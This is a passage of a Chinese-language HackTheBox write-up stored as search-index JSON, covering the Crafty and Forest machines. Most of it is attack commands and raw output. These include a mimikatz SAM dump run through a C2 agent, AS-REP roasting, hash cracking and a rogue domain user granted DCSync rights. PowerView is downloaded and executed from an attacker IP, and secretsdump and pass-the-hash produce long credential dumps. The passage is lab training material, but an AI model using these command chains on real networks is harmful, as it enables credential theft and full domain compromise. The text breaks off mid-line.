http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning (JUST GUESSING): Microsoft Windows 2019 (88%)\nAggressive OS guesses: Microsoft Windows Server 2019 (88%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre>"}, {"location": "HackTheBox/Machines/Crafty/#web", "title": "Web", "text": "<p>\u4f3c\u4e4e\u662f Minecraft\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684 25565 \u7aef\u53e3\u5e94\u8be5\u662f Mc \u7684\u670d\u52a1\u7aef\u53e3\u3002</p>"}, {"location": "HackTheBox/Machines/Crafty/#minecraft", "title": "Minecraft", "text": "<p>https://github.com/HMCL-dev/HMCL/releases/download/v3.5.5.235/HMCL-3.5.5.235.jar</p> <ul> <li>HMCL \u5b89\u88c5\u5bf9\u5e94\u7248\u672c</li> </ul> <p></p> <p></p> <p></p> <pre><code>runascs.exe administrator s67u84zKq8IXw whoami\n</code></pre> <p></p>"}, {"location": "HackTheBox/Machines/Crafty/#dump-hash", "title": "Dump Hash", "text": "<pre><code>Demon \u00bb shell m.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" exit\n[*] [D9458EC1] Tasked demon to execute a shell command\n[+] Send Task to Agent [222 bytes]\n[+] Received Output [4098 bytes]:\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       &gt; https://blog.gentilkiwi.com/mimikatz\n '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/\n\nmimikatz(commandline) # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # token::elevate\nToken Id  : 0\nUser name : \nSID name  : NT AUTHORITY\\SYSTEM\n\n548 {0;000003e7} 1 D 37203      NT AUTHORITY\\SYSTEM S-1-5-18    (04g,21p)   Primary\n -&gt; Impersonated !\n * Process Token : {0;002affa5} 1 D 3042162     CRAFTY\\Administrator    S-1-5-21-4088429403-1159899800-2753317549-500   (14g,24p)   Primary\n * Thread Token  : {0;000003e7} 1 D 3076660     NT AUTHORITY\\SYSTEM S-1-5-18    (04g,21p)   Impersonation (Delegation)\n\nmimikatz(commandline) # lsadump::sam\nDomain : CRAFTY\nSysKey : ad7915b8e6d4f9ee383a5176349739e3\nLocal SID : S-1-5-21-4088429403-1159899800-2753317549\n\nSAMKey : 49c22e412c9f412fa291a26d8b76f51e\n\nRID  : 000001f4 (500)\nUser : Administrator\n  Hash NTLM: 686d56296249595a2bc3d7a8807958ad\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 0bdf8f741aa491284a8ac838d18aaa99\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : CRAFTYAdministrator\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : d5e84590aaa54c5d67a0169f0e40a90b105120f7d8f3586bab7d4ccd2aa6014a\n      aes128_hmac       (4096) : 582238b622dd89769812f4e49444932c\n      des_cbc_md5       (4096) : 6be63ed6c29ef845\n    OldCredentials\n      aes256_hmac       (4096) : 497ef0207b9c224fbd7ecc2399163749912b1b444c4c0c238416534c7a0825b2\n      aes128_hmac       (4096) : 018d5701fbad4cedf69d07b49a612651\n      des_cbc_md5       (4096) : 9d493de025f2ad1a\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:Kerberos *\n    Default Salt : CRAFTYAdministrator\n    Credentials\n      des_cbc_md5       : 6be63ed6c29ef845\n    OldCredentials\n      des_cbc_md5       : 9d493de025f2ad1a\n\n\nRID  : 000001f5 (501)\nUser : Guest\n\nRID  : 000001f7 (503)\nUser : DefaultAccount\n\nRID  : 000001f8 (504)\nUser : WDAGUtilityAccount\n  Hash NTLM: 7f920fb73571539eb18c0b2f876cfda0\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 7fc6a89643684e2a14f03126d2546715\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : WDAGUtilityAccount\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 08e29c7564ee9474195115af207f62c793975d95bbcf160d64cba63850e684db\n      aes128_hmac       (4096) : 2d189a6987f7ec21bd30e270d68ee04f\n      des_cbc_md5       (4096) : 154a0be99270e926\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:Kerberos *\n    Default Salt : WDAGUtilityAccount\n    Credentials\n      des_cbc_md5       : 154a0be99270e926\n\n\nRID  : 000003e9 (1001)\nUser : jacob\n  Hash NTLM: cf3a5525ee9414229e66279623ed5c58\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : aecc3efbd04cb2887709cbfe1efe3d83\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : COMPETITORjacob\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 55d5341ecb9ec774bb541cad47eb60c38b0d8e56b2ea3826be18cd99d9be857a\n      aes128_hmac       (4096) : 1e1453a187f5a68a7fa4fca035d3409e\n      des_cbc_md5       (4096) : b615c7e052c4fe08\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:Kerberos *\n    Default Salt : COMPETITORjacob\n    Credentials\n      des_cbc_md5       : b615c7e052c4fe08\n\n\nRID  : 000003ea (1002)\nUser : svc_minecraft\n  Hash NTLM: 786082f9a8cb7872767bb1a4b7934451\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : 78bcc5add4a3f344ba492d3f8a17de78\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : CRAFTYsvc_minecraft\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 3e455203823c8c94c7333c7cff2b830897721f19189f1d6ee8603134ae58786b\n      aes128_hmac       (4096) : 9bae77b1dc4d62\n[+] Received Output [576 bytes]:\nc134517ac2d14156c3\n      des_cbc_md5       (4096) : 43a1df10c1a4c852\n    OldCredentials\n      aes256_hmac       (4096) : e7dbf66db8ea7937415898cc87200940faa75c5056795c9b02347c0366c483d3\n      aes128_hmac       (4096) : e50c102b7686cfd27b0f46b1f0a78b44\n      des_cbc_md5       (4096) : 2cbccde3d501ba15\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:Kerberos *\n    Default Salt : CRAFTYsvc_minecraft\n    Credentials\n      des_cbc_md5       : 43a1df10c1a4c852\n    OldCredentials\n      des_cbc_md5       : 2cbccde3d501ba15\n\n\nmimikatz(commandline) # exit\nBye!\n</code></pre>"}, {"location": "HackTheBox/Machines/Forest/", "title": "Forest", "text": ""}, {"location": "HackTheBox/Machines/Forest/#recon-enum", "title": "Recon &amp; Enum", "text": "<p>export IP=10.10.10.161 - <code>nmap -sC -A -p- --min-rate 1000 -T4 $IP</code> <pre><code>PORT      STATE SERVICE      VERSION\n88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2024-01-10 07:52:25Z)\n135/tcp   open  msrpc        Microsoft Windows RPC\n139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn\n389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n9389/tcp  open  mc-nmf       .NET Message Framing\n47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-server-header: Microsoft-HTTPAPI/2.0\n|_http-title: Not Found\n49664/tcp open  msrpc        Microsoft Windows RPC\n49665/tcp open  msrpc        Microsoft Windows RPC\n49666/tcp open  msrpc        Microsoft Windows RPC\n49667/tcp open  msrpc        Microsoft Windows RPC\n49671/tcp open  msrpc        Microsoft Windows RPC\n49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0\n49677/tcp open  msrpc        Microsoft Windows RPC\n49682/tcp open  msrpc        Microsoft Windows RPC\n49704/tcp open  msrpc        Microsoft Windows RPC\n49942/tcp open  msrpc        Microsoft Windows RPC\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2016 (95%), Microsoft Windows Server 2016 build 10586 - 14393 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 or Server 2012 R2 (91%), Microsoft Windows 10 (91%), Microsoft Windows 10 1507 (91%), Microsoft Windows 10 1507 - 1607 (91%), Microsoft Windows 10 1511 (91%), Microsoft Windows Server 2012 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s\n| smb-security-mode: \n|   account_used: &lt;blank&gt;\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: required\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2024-01-10T07:53:39\n|_  start_date: 2024-01-10T04:01:02\n| smb-os-discovery: \n|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)\n|   Computer name: FOREST\n|   NetBIOS computer name: FOREST\\x00\n|   Domain name: htb.local\n|   Forest name: htb.local\n|   FQDN: FOREST.htb.local\n|_  System time: 2024-01-09T23:53:38-08:00\n</code></pre> - <code>crackmapexec</code> <pre><code>export DOAMIN=htb.local\ncrackmapexec smb $IP -d $DOMAIN -u guest -p '' --shares\ncrackmapexec smb $IP -d $DOMAIN --rid-brute 10000\n---\nNull\n</code></pre> - <code>ldapsearch</code> <pre><code>$ ldapsearch -H \"ldap://$IP\" -x -s base namingcontexts\n---\nnamingContexts: DC=htb,DC=local\n...\n\n$ ldapsearch -H \"ldap://$IP\" -x -b \"DC=htb,DC=local\" &gt; ldap_htb_local.txt\n$ cat ldap_htb_local.txt | grep userPrincipalName\n---\n... # \u7528\u6237\u8d26\u6237\nuserPrincipalName: sebastien@htb.local\nuserPrincipalName: santi@htb.local\nuserPrincipalName: lucinda@htb.local\nuserPrincipalName: andy@htb.local\nuserPrincipalName: mark@htb.local\n\n$ cat ldap_htb_local.txt | grep 'OU=Service Accounts'\n---\n... # \u670d\u52a1\u8d26\u6237\ndn: CN=svc-alfresco,OU=Service Accounts,DC=htb,DC=local\n</code></pre> - \u670d\u52a1\u8d26\u6237\u53ef\u80fd\u4f1a\u7981\u7528 Kerberos \u9884\u8eab\u4efd\u9a8c\u8bc1\uff0c\u56e0\u6b64\u5c1d\u8bd5 ASREP-Roasting <pre><code>impacket-GetNPUsers htb.local/svc-alfresco -dc-ip $IP -no-pass -format hashcat -outputfile hash.list\n---\nImpacket v0.11.0 - Copyright 2023 Fortra\n\n[*] Getting TGT for svc-alfresco\n$krb5asrep$23$svc-alfresco@HTB.LOCAL:c1f9ba755560726f8ea905a4f55b32d9$5cdd71e39c6eea984b166ab7e82fa0b1a4fb93124196e6cd6923512cb97be1e8360053e8660821f0cbf108eb64d0cbc6293258abf857fcf62626bcd776787826148ee6630db3fc702d994b5fbdf1c175e4d397b0827274858c6068b3b5d1fb83333493a17082e52a357b9451b4f2d8bd7340a0339c36af2a942e626ec77dd1ef74ced153a70b83f4d66fbc52709dfa6efa7e5d4b15fb0b78271c28cc18cb0ec461629009b5d3d5abbdb77cc5598ac80613976f60cbcc4029bf8732d47347dfa3806dc3a1adf93575f72136994950d42ce3658f53aa56d8cd8ea0b07882b122b99ddd1600fe42\n</code></pre></p>"}, {"location": "HackTheBox/Machines/Forest/#shell-as-user-svc-alfresco", "title": "Shell as User - svc-alfresco", "text": "<ul> <li>\u7206\u7834\u52a0\u5bc6\u7684 TGT <pre><code>john hash.list --wordlist=/usr/share/wordlists/rockyou.txt\n---\n    s3rvice          (krb5asrep$23$svc-alfresco@HTB.LOCAL)\n</code></pre></li> <li><code>evil-winrm -i $IP -u svc-alfresco -p s3rvice</code> </li> <li>\u770b\u5230\u4e3b\u57df\u662f <code>FOREST.htb.local</code> \u5f00\u59cb\u905b\u72d7 <pre><code>bloodhound-python -d htb.local -ns 10.10.10.161 -c all -u 'svc-alfresco' -p 's3rvice'\n# \u8fd9\u91cc\u9776\u673a\u597d\u50cf DNS \u6709\u70b9\u95ee\u9898\uff0c\u6362\u6210 exe \u905b\u72d7\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; Bypass-4MSI\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; ./SharpHound.exe --CollectionMethods All\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; download \n</code></pre></li> </ul>"}, {"location": "HackTheBox/Machines/Forest/#shell-as-user-newboy", "title": "Shell as User - newboy", "text": "<ul> <li>\u6807\u8bb0\u5df2\u6709\u8d26\u53f7\u4e3a Owned\uff0c\u641c\u7d22\u5230\u8fbe HTB.LOCAL \u7684\u8def\u5f84 </li> <li><code>svc-alfresco</code> \u5c5e\u4e8e <code>Account Operators</code> \u7ec4\uff0c</li> <li><code>Exchange Windows Permissions</code> \u7ec4\u6709 <code>WriteDacl</code> \u6743\u9650\u4e14\u4e0d\u53d7\u4fdd\u62a4 \u56e0\u6b64\u53ef\u4ee5\u901a\u8fc7 <code>svc-alfresco</code> \u7528\u6237\u521b\u5efa\u65b0\u7528\u6237\uff0c\u5e76\u5c06\u5176\u6dfb\u52a0\u5230 <code>Exchange Windows Permissions</code> \u7ec4\uff0c\u7136\u540e\u5229\u7528 <code>Exchange Windows Permissions</code> \u7ec4\u7684 <code>WriteDacl</code> \u6743\u9650\u4fee\u6539\u7528\u6237 <code>ACEs</code> \uff0c\u8d4b\u4e88 DCSync \u6743\u9650\uff0cDump Hash</li> <li>\u6dfb\u52a0\u65b0\u7528\u6237 newboy\uff0c\u6dfb\u52a0\u5230\u6240\u9700\u7528\u6237\u7ec4 <pre><code>net user newboy Admin@123 /add /domain\nnet group \"Exchange Windows Permissions\" newboy /add\nnet localgroup \"Remote Management Users\" newboy /add\n</code></pre></li> <li>\u767b\u5f55 newboy \u7528\u6237 <code>evil-winrm -i $IP -u 'newboy' -p 'Admin@123' -s .</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Forest/#shell-as-root", "title": "Shell as Root", "text": "<ul> <li>newboy \u7528\u6237\u8d4b\u4e88\u81ea\u5df1 DCSync \u6743\u9650 <pre><code>[*Evil-WinRM* PS C:\\&gt; ]\nBypass-4MSI\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.18/PowerView.ps1\")\n# \u6dfb\u52a0 DCSync \u6743\u9650\nAdd-ObjectAcl -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity newboy -Rights DCSync -Verbose\n\n# \u5220\u9664 DCSync \u6743\u9650\nRemove-DomainObjectAcl -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity newboy -Rights DCSync -Verbose\n</code></pre></li> <li>\u4e5f\u53ef\u4ee5\u5728 <code>svc-alfresco</code> \u7528\u6237\u4e2d\u4f7f\u7528\u51ed\u636e\u8d4b\u4e88 newboy \u7528\u6237 <pre><code>[*Evil-WinRM* PS C:\\&gt; ]\nBypass-4MSI\nIEX(New-Object Net.WebClient).DownloadString(\"http://10.10.16.18/PowerView.ps1\")\n\n$pass = convertto-securestring 'Admin@123' -asplain -force\n$cred = new-object system.management.automation.pscredential(\"htb\\newboy\", $pass)\n\nAdd-ObjectACL -PrincipalIdentity newboy -Credential $cred -Rights DCSync -Verbose\n</code></pre></li> <li><code>impacket-secretsdump htb/newboy:'Admin@123'@10.10.10.161</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\n...\n</code></pre></li> <li><code>evil-winrm -i 10.10.10.161 -u Administrator -H '32693b11e6aa90eb43d32c72a07ceea6'</code> </li> </ul>"}, {"location": "HackTheBox/Machines/Forest/#dump-hash", "title": "Dump Hash", "text": "<p><code>impacket-secretsdump htb.local/administrator@10.10.10.161 -hashes 'aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6'</code> <pre><code>Impacket v0.11.0 - Copyright 2023 Fortra\n\n[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nhtb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nkrbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nhtb.local\\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::\nhtb.local\\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::\nhtb.local\\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::\nhtb.local\\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::\nhtb.local\\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::\nhtb.local\\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::\nhtb.local\\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::\nhtb.local\\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::\nhtb.local\\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::\nhtb.local\\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::\nhtb.local\\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::\nhtb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::\nhtb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::\nhtb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::\nhtb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::\nhtb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::\nhtb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::\namirr0r:9601:aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4:::\njohn:9603:aad3b435b51404eeaad3b435b51404ee:44f077e27f6fef69e7bd834c7242b040:::\nybgm:9604:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::\nnewboy:9605:aad3b435b51404eeaad3b435b51404ee:570a9a65db8fba761c1008a51d4c95ab:::\nFOREST$:1000:aad3b435b51404eeaad3b435b51404ee:6e8994c29db248d6a8940013da1adf51:::\nEXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::\n[*] Kerberos keys grabbed\nhtb.local\\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913\nhtb.local\\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375\nhtb.local\\Administrator:des-cbc-md5:c1e049c71f57343b\nkrbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b\nkrbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58\nkrbtgt:des-cbc-md5:9dd5647a31518ca8\nhtb.local\\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4\nhtb.local\\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e\nhtb.local\\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e\nhtb.local\\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf\nhtb.local\\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd\nhtb.local\\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e\nhtb.local\\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e\nhtb.local\\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed\nhtb.local\\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983\nhtb.local\\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91\nhtb.local\\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f\nhtb.local\\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a\nhtb.local\\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c\nhtb.local\\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8\nhtb.local\\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d\nhtb.local\\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81\nhtb.local\\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6\nhtb.local\\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5\nhtb.local\\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a\nhtb.local\\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2\nhtb.local\\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29\nhtb.local\\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7\nhtb.local\\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538\nhtb.local\\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702\nhtb.local\\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352\nhtb.local\\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d\nhtb.local\\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701\nhtb.local\\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd\nhtb.local\\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36\nhtb.local\\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb\nhtb.local\\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c\nhtb.local\\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3\nhtb.local\\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054\nhtb.local\\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161\nhtb.local\\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a\nhtb.local\\sebastien:des-cbc-md5:702a3445e0d65b58\nhtb.local\\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5\nhtb.local\\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad\nhtb.local\\lucinda:des-cbc-md5:a13bb56bd043a2ce\nhtb.local\\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32\nhtb.local\\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea\nhtb.local\\svc-alfresco:des-cbc-md5:014ac86d0b98294a\nhtb.local\\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f\nhtb.local\\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6\nhtb.local\\andy:des-cbc-md5:a2ab5eef017fb9da\nhtb.local\\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6\nhtb.local\\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81\nhtb.local\\mark:des-cbc-md5:b5dff1f40b8f3be9\nhtb.local\\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427\nhtb.local\\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25\nhtb.local\\santi:des-cbc-md5:4075ad528ab9e5fd\namirr0r:aes256-cts-hmac-sha1-96:1bcb06ac63d36244df3f5e5caf71124272fb4f3a39a92f7388e0dae5c6a1e994\namirr0r:aes128-cts-hmac-sha1-96:4579d5cfdce40a61edd38e611ecb54a4\namirr0r:des-cbc-md5:942f64df5b4f68c4\njohn:aes256-cts-hmac-sha1-96:d62a736f49f88defdf75b0d9dde229c06e610deab92f16551e66f4a48c034aaf\njohn:aes128-cts-hmac-sha1-96:cc9cf4f03dd5bc20ce617ce19a6c0f1d\njohn:des-cbc-md5:b5b657cdc86d2668\nybgm:aes256-cts-hmac-sha1-96:aae35b403a49bd4de61ae7940d133fd83536ebfa8df38a0fd4c6530ff1ce2e40\nybgm:aes128-cts-hmac-sha1-96:27579d1809bf954ed207b29953da656e\nybg